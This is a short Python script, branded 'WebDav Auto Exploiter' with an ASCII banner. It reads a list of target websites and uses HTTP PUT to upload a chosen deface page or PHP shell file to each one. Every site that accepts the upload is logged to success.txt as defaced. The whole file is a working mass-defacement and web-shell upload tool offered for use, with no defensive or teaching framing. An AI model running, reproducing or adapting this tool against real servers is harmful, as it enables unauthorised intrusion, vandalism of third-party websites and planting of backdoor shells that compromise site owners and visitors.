import requests
import os
from colorama import Fore,Style
import platform
def banner():
    plat = platform.platform()
    if "Windows" in plat:
        os.system("cls")
    else:
        os.system("clear")
    print(Fore.LIGHTRED_EX+"""
    coded by  : matin nouriyan
    ███╗   ███╗ █████╗ ████████╗██╗████████╗ █████╗ ███╗   ██╗██╗██╗   ██╗███╗   ███╗
    ████╗ ████║██╔══██╗╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║██║██║   ██║████╗ ████║
    ██╔████╔██║███████║   ██║   ██║   ██║   ███████║██╔██╗ ██║██║██║   ██║██╔████╔██║
    ██║╚██╔╝██║██╔══██║   ██║   ██║   ██║   ██╔══██║██║╚██╗██║██║██║   ██║██║╚██╔╝██║
    ██║ ╚═╝ ██║██║  ██║   ██║   ██║   ██║   ██║  ██║██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
		  ×_x     WebDav Auto Exploiter     -_-
			 iranian Cyber-Security!                                                        
	""")

#Don't Change logo :3

def main():
	list=input(Fore.GREEN + "Enter your sites list:(example:target.txt)==> ")
	d=input(Fore.MAGENTA + "Enter shell/deface file:(example:index.html/Alpha.php)==> ")#place your deface file in the same Directory
	opene=open(list,"r")
	data=open(d).read()
	d="/"+d
	for i in opene:
		try:
			i=i.strip()
			if 'http://' not in i:
				i='http://'+i
			req=requests.Session().put(i+d,data=data)
			if req.status_code==200:
				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
				f=open("success.txt","a")
				f.write(i+d+"\n")
				f.close()
			else:
				print(Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d)
		except  requests.exceptions.RequestException:
			continue
#code by matitanium :D
try:
	banner()
	main()
	print('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'Deafced Sites are saved as success.txt',Fore.CYAN,'[+]',Style.RESET_ALL)
except:
	print(Fore.RED + "unknow error :D")